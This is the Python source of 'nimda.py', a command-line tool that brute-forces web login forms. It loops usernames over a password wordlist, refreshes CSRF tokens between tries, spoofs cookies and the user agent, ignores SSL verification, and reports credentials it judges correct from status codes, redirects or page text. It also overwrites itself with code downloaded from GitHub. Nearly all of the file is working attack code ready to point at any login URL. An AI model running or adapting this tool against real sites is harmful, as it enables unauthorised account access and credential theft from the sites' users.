version=1.7
nimda = """
{}
 mm   m mmmmm  m    m mmmm     mm
 #"m  #   #    ##  ## #   "m   ##
 # #m #   #    # ## # #    #  #  #
 #  # #   #    # "" # #    #  #mm#
 #   ## mm#mm  #    # #mmm"  #    #.py

{} v {} {}
"""


try:
    import argparse
    import operator
    import requests
    import datetime
    import time
    import sys
    import os
except ImportError:
    raise ImportError('<Errors occured :(. Some importing problem detected>')

initTime = datetime.datetime.now().time()


def checkForUpdates():
    try:
        req = requests.get("https://raw.githubusercontent.com/bichiko/nimda.py/master/nimda.py")
        lines = req.text.split('\n')
        for line in lines:
            if "version" in line:
                servVersion = float(line.split('=')[1]) 
                if servVersion > version:
                    usrans = raw_input("New version (%s) is avalialbe. Do you want to update it now? (Y/n) " % (servVersion))
                    if usrans.lower() == 'y':
                        f = open(__file__,"w+")
                        f.write(req.text)
                        f.close()
                        print "Nimda.py has been updated. v %s"%servVersion
                        print "Please run it again"
                        sys.exit(0)
                
            break
    except Exception:
        print "Error: In update checking"

class bcolors:
    HEADER  =   '\033[95m'
    OKBLUE  =   '\033[94m'
    OKGREEN =   '\033[92m'
    WARNING =   '\033[93m'
    FAIL =      '\033[91m'
    ENDC =      '\033[0m'
    BOLD =      '\033[1m'
    UNDERLINE = '\033[4m'



class CliPrint:
    def __init__(self):
        self.currTime = datetime.datetime.now().time()

    def printLogo(self):
        print nimda.format(bcolors.WARNING,bcolors.FAIL, version, bcolors.ENDC)

    def headerText(self, this):
        print "[{}] Trying combination of username(s) {} with provided passwords from {} file".format(initTime,this.usernames, this.passwordsTxt)
        print "[%s] Brute-forcing %s" % (initTime,this.url)
        print "[%s] Delay is  %s milliseconds" % (initTime,this.delaySec)
        print "[%s] Request method : %s" % (initTime,this.method.upper())
        

    def errorText(self, text, ext = False):
        print '['+str(self.currTime)+'] '+bcolors.FAIL+str(text)+bcolors.ENDC
        sys.exit(0) if ext else None
    
    def infoText(self, text, ext = False):
        print '['+str(self.currTime)+'] '+bcolors.OKBLUE+str(text)+bcolors.ENDC+'\n'
        sys.exit(0) if ext else None

    def warnText(self, text, ext = False):
        print '['+str(self.currTime)+'] '+bcolors.WARNING+str(text)+bcolors.ENDC+'\n'
        sys.exit(0) if ext else None

    def purpleText(self, text, ext = False):
        print '['+str(self.currTime)+'] '+bcolors.HEADER+str(text)+bcolors.ENDC
        sys.exit(0) if ext else None

    def getTime(self):
        return str(self.currTime)

try:
    from pyquery import PyQuery
except Exception:
    CliPrint().errorText('Error: You don\'t have library pyquery')
    CliPrint().infoText('Please run command:  sudo pip install pyquery', True)

try:
    from time import sleep
except Exception:
    CliPrint().errorText('Error: Probably you don\'t have library time or sleep')
    CliPrint().infoText('Please run command:  sudo pip install time/sleep', True)



class Brute:
    """Main class for BruteForce."""
    def __init__(self):
        self.breakFirstMatch = False
        self.responseHeader = False
        self.responseHtml = False
        self.csrfEnabled = False
        self.progresBar = False
        self.debugging = False
        self.verbose = False
        self.delaySec = 0
        self.statusCode = 0
        self.requestsCounter = 0
        self.correctCredentials = []
        self.startTime = time.time()
        self.csrfSelector = ''
        self.contentText = ''
        self.notContentText = ''
        self.contentHeader = ''
        self.progressDots = ''
        self.notContentHeader = ''
        self.setCookie = ''
        self.usernames = None
        self.url = None
        self.passwordsTxt = None
        self.postJson = dict()
        self.formName = dict()
        self.ses = requests.session()
        self.os = 'win' if os.name == 'nt' else 'lin'
        self.cookie = None
        self.useragent = None
        self.sslVerify = False
        self.redirectCheck = True
        self.method = 'POST'
        self.tm_now = time.time()
        self.tm_prev = 0.0
        self.ss = 0
        self.mm = 0
        self.hh = 0
        self.dd = 0



    def getCookie(self):
        cookieDict = dict()
        if self.cookie is None:
            return ''
        cookieJar = [x.split('=') for x in self.cookie.split(";")]        
        [cookieDict.update({key[0].strip():key[1].strip()}) for key in cookieJar]
        return cookieDict

    #Method URL setter
    def setUrl(self, url):
        self.url = url
        return self
    
    #CSRF setter method
    def setCsrf(self, csrf):
        self.formName.update({'csrf':csrf})
        self.csrfEnabled = True
        return self
   
    #usernames setter
    def setUsernames(self, usernames):
        try:
            self.formName.update({'username':usernames.split('=')[0]})
            self.usernames = usernames.split('=')[1].split(',')
        except Exception:
            CliPrint().errorText('Error: username isn\'t specified correctly')
            CliPrint().infoText('syntax: username=\'user=admin,root\'', True)

    #passwords setter method
    def setPasswords(self, passwdTxt):
        try:
            self.formName.update({'password':passwdTxt.split('=')[0]})
            self.passwordsTxt = passwdTxt.split('=')[1]
        except Exception:
            CliPrint().errorText('Error: password isn\'t specified correctly')
            CliPrint().infoText('syntax: password=\'pwd=passwd.txt\'', True)

    #post data setter
    def setData(self, pData):
        """ ppdata is without usernames and passwords """
        try:
            pdt = pData.split('&')
            for x in range(0, len(pdt)):
                currel = pdt[x].split('=')
                self.postJson.update({currel[0]:currel[1]})
        except Exception:
            CliPrint().errorText('Error: Can\'t parse data')
            CliPrint().infoText('syntax: data=\'param1=val1&param2=val2&signin=Sign In\'', True)
            
    # sned empty request to initialize parameters
    def sendEmptyPostRequest(self):
        tmpJson = self.postJson
        tmpJson.update({self.formName['username']:'00000000'})
        tmpJson.update({self.formName['password']:'00000000'})

        if self.csrfEnabled == True:
            self.postJson.update({self.formName['csrf']:'00000000'})

        try:
            if self.method.lower() == 'post':
                firstReq = self.ses.post(self.url, data = tmpJson, verify = self.sslVerify, cookies=self.getCookie(), headers={'user-agent':self.useragent})
            else:
                firstReq = self.ses.get(self.url, data = tmpJson, verify = self.sslVerify, cookies=self.getCookie(), headers={'user-agent':self.useragent})
        except Exception:
            CliPrint().errorText('Error: Can\'t send 1st request', True)
        return firstReq

    #find CSRF token in response HTML get element and return it
    def getCsrfToken(self, response, selector):
        try:
            pq = PyQuery(response.text)
            tag = pq(selector)
        except Exception:
            CliPrint().errorText('Error: Can\'t parse response HTML document', True)
        return tag


    def correctValOutput(self,PV,text,redir = False, corct = True):
         # reset session 
        correctValue = None
        self.progressDots += bcolors.OKGREEN +'*'+bcolors.ENDC if len(self.progressDots) < 10000 else ''
        stat_code = PV[8] if redir else PV[3]
        correct = PV[0] if corct else PV[7]
        if self.verbose:
            correctValue = "{}{} : {}, data: {}{}".format(correct,text,stat_code,PV[4],PV[5])
        else:
            correctValue = "{}{}:{}{}".format(correct,PV[1],PV[2],PV[5])

        #print correct value in specified mode
        print '['+CliPrint().getTime()+'] '+correctValue
        #save credentials in the array
        self.correctCredentials.append(correctValue)
        self.ses = requests.session()


    def startProccessing(self):
        # Print header/welcome text
        CliPrint().headerText(self)

        #grab CSRF token value from previous request
        csrf_token = self.getCsrfToken(self.sendEmptyPostRequest(), self.csrfSelector).val()
        
        #get a size of the dictionary
        sizeOfDict = sum(1 for line in open(self.passwordsTxt))
        
        #loop usernames
        for usrnms in self.usernames:
            #open passwords dictionary as _dict variable
            with open(self.passwordsTxt) as _dict:
                #loop _dict array and read value line by line
                for passwd in _dict:
                    #Just count my requests
                    self.requestsCounter+=1
                   
                    #sleep in milliseconds if value is defined by user
                    # otherwise it is 0 by default.
                    #speed of requests depends on network condition
                    #every new request waits response to parse important data like cstf token and then trys to proceed
                    sleep(float(self.delaySec) / 1000) #milliseconds

                    # remove previous csrf value if csrf mode is enabled
                    if self.csrfEnabled == True:
                        del self.postJson[self.formName['csrf']]

                    #delete previous values from formdata list
                    del self.postJson[self.formName['username']]
                    del self.postJson[self.formName['password']]

                    # If csrf mode is enabled then add new key:value in formdata
                    if self.csrfEnabled == True:
                        self.postJson.update({self.formName['csrf'] : csrf_token})

                    #update formdata with new value of username
                    self.postJson.update({self.formName['username'] : usrnms})

                    # remove \n endlines from txt file
                    # and update password value
                    self.postJson.update({self.formName['password'] : passwd.rstrip()})

                    # debugging mode is on then print Post data
                    if self.debugging == True:
                        print self.postJson

                    # try to send request with current session
                    # ignore ssl check
                    try:
                        if self.method.lower() == 'post':
                            req = self.ses.post(self.url, data = self.postJson, verify = self.sslVerify, cookies=self.getCookie(), headers={'user-agent':self.useragent})
                        else:
                            req = self.ses.get(self.url, data = self.postJson, verify = self.sslVerify, cookies=self.getCookie(), headers={'user-agent':self.useragent})
                    except requests.exceptions.HTTPError as errh:
                        CliPrint().errorText("Http Error :"+errh, True)
                    except requests.exceptions.ConnectionError as errc:
                        CliPrint().errorText("Error Connecting :"+errc, True)
                    except requests.exceptions.Timeout as errt:
                        CliPrint().errorText("Timeout Error :"+errt, True)
                    except requests.exceptions.RequestException as err:
                        CliPrint().errorText("Error: Something happened "+err, True)


                    #spinner. Custom loading gif 
                    if self.verbose != True:
                        os.system('cls') if self.os == 'win' else os.system('clear')
                        mySpinner = '\ '
                        if self.requestsCounter % 4 == 0:
                            mySpinner = '\ '
                        elif self.requestsCounter % 4 == 1:
                            mySpinner = '| '
                        elif self.requestsCounter % 4 == 2:
                            mySpinner = '/ '
                        else:
                            mySpinner = '- '

                    

                    # if not verbose mode the output just correct credentials                   
                    if self.verbose != True:
                        CliPrint().headerText(self)
                        for cr in self.correctCredentials:
                            print ' - '+ cr
                        CliPrint().purpleText("{} : {}".format(usrnms, passwd.rstrip()))
                        CliPrint().purpleText("{} out of {}".format(self.requestsCounter, sizeOfDict*len(self.usernames)))

                       
                        print "{}".format(self.progressDots) if self.progresBar == True else None
                            
                        CliPrint().purpleText("{} {} seconds elapsed".format(mySpinner, time.time() - self.startTime))
                    
                    PV = [bcolors.OKGREEN, usrnms, passwd.rstrip(),req.status_code, self.postJson, bcolors.ENDC, bcolors.FAIL,bcolors.HEADER,req.history]
                    
                    if (int(self.statusCode) == int(req.status_code)) or ((self.contentText != '' and self.contentText in req.text) or (self.notContentText != '' and self.notContentText not in req.text)) or ((self.contentHeader != '' and self.contentHeader in req.text) or (self.notContentHeader != '' and self.notContentHeader not in req.text)):
                        self.correctValOutput(PV,'Correct! status-code');break
                    
                    elif self.redirectCheck == True and len(req.history)>0:
                        self.correctValOutput(PV,'Correct! redirec-code',True);break
                    
                    elif self.csrfEnabled and csrf_token == None:
                        self.correctValOutput(PV,'Possible combination! can\'t find csrf_token',False, False);break
                    else:
                        self.progressDots += bcolors.FAIL +'.'+bcolors.ENDC if len(self.progressDots) < 10000 else ''
                        CliPrint().errorText("{}WRONG! {}:{}, data: {}{}".format(PV[6],PV[1],PV[2],PV[4],PV[5])) if self.verbose == True else None
                        
                   
                    CliPrint().warnText("response-HTML: {}".format(req.text.encode('utf-8'))) if self.responseHtml == True else None
                    CliPrint().warnText("response-header: {}".format(req.headers)) if self.responseHeader == True else None
                    
                    if self.csrfEnabled == True:
                        csrf_token = self.getCsrfToken(req, self.csrfSelector).val()

                    #save current time value
                    self.tm_prev=time.time()


        #print logo in the end
        CliPrint().printLogo() if self.verbose else None

        print "Done in {} seconds".format(time.time() - self.startTime)
        for cr in self.correctCredentials:
            print cr
        if len(self.correctCredentials) == 0:
            CliPrint().errorText('%sSorry we couldn\'t find any matched credentials%s' % (bcolors.FAIL, bcolors.ENDC))

if __name__ == "__main__":
    #print logo
    CliPrint().printLogo()

    #check for updates
    checkForUpdates()

    #create instance of the main class
    brt = Brute()
    #get all passed variables
    items = sys.argv
    #set exec mode to True if there is at least one variable passed after filename
    execProgram = False if len(items) <= 1 else True
    
    
    # construct the argument parse and parse the arguments
    ap = argparse.ArgumentParser()
    ap.add_argument("--username", required=True, help="specifiy username(s): ex. --username='lg_username=admin,root,nick'")
    ap.add_argument("--password", required=True, help="file name with path or without it. ex: --password='lg_password=./dicts/pass.txt'")
    ap.add_argument("--url", required=True, help="a form submit URL")
    ap.add_argument("--data", required=False, default="action=submit", help="all form data excepr username and password like: action=submit&access=2")
    ap.add_argument("--method", required=False, default='POST', help="method: post or get. default post")
    ap.add_argument("--csrf-selector", required=False, help="element query selector inside document. ex: div.login-form#csrf")
    ap.add_argument("--csrf-token-name", required=False, help="form element name for csrf token")
    ap.add_argument("--content-text", required=False, help="if response contains specified text then password is assumed as correct: ex welcome")
    ap.add_argument("--not-content-text", required=False, help="if response doesnt contain specified text then password is assumed as correct")
    ap.add_argument("--content-header", required=False, help="if response header contains specified text then password is assumed as correct")
    ap.add_argument("--progress-bar", required=False, default=False, help="show progress bar")
    ap.add_argument("--show-response-html", required=False, default=False, help="show response html content")
    ap.add_argument("--show-response-header", required=False, help="show header text")
    ap.add_argument("--status-code", required=False, default=302, help="assume password as correct if servers respons is specified status code. default 302")
    ap.add_argument("--delay", required=False, default=0, help="delay: spevifay delay per request in milliseconds. ex --delay=100")
    ap.add_argument("--cookie", required=False, help="specifiy cookies. --cookie='PHPSESSID=jksagdjksagdjkgjksg;usr=12'")
    ap.add_argument("--user-agent", required=False, help="specify user agent")
    ap.add_argument("--redirect-check", required=False, help="check redirects")
    ap.add_argument("--verbose", required=False, default=False, help="show all info")
    ap.add_argument("--debugging", required=False, default=False, help="print all info for debugging")
    ap.add_argument("--first-match", required=False, default=True, help="stop when first credentials match")
    
    args = vars(ap.parse_args())

    if('username' in args):
        brt.setUsernames(args['username']) 
    if('url' in args):
        brt.setUrl(args['url']) 
    if('password' in args):
        brt.setPasswords(args['password']) 
    if('data' in args):
        brt.setData(args['data']) 
    if('csrf-selector' in args):
        brt.csrfSelector = args['csrf-selector'] 
    if('csrf-token-name' in args):
        brt.setCsrf(args['csrf-token-name']) 
    if('content-text' in args):
        brt.contentText = args['content-text']
    if('not-content-text' in args):
        brt.notContentHeader = args['not-content-text']
    if('content-text' in args):
        brt.contentHeader = args['content-text']
    if('progress-bar' in args):
        brt.progresBar = bool(args['progress-bar'])
    if('show-response-html' in args):
        brt.responseHtml = bool(args['show-response-html'])
    if('show-response-header' in args):
        brt.responseHeader = bool(args['show-response-header'])
    if('status-code' in args):
        brt.statusCode = args['status-code']
    if('delay' in args):
        brt.delaySec = args['delay']
    if('cookie' in args):
        brt.cookie = args['cookie']
    if('method' in args):
        brt.method = args['method'] 
    if('user-agent' in args):
        brt.useragent = args['user-agent'] 
    if('redirect-check' in args):
        brt.redirectCheck = args['redirect-check'] 
    if('verbose' in args):
        brt.verbose = bool(args['verbose']) 
    if('debugging' in args):
        brt.debugging = bool(args['debugging']) 
    if('first-match' in args):
        brt.breakFirstMatch = bool(args['first-match']) 


    #if program is in exec mode then execute it
    brt.startProccessing() if execProgram else None

        
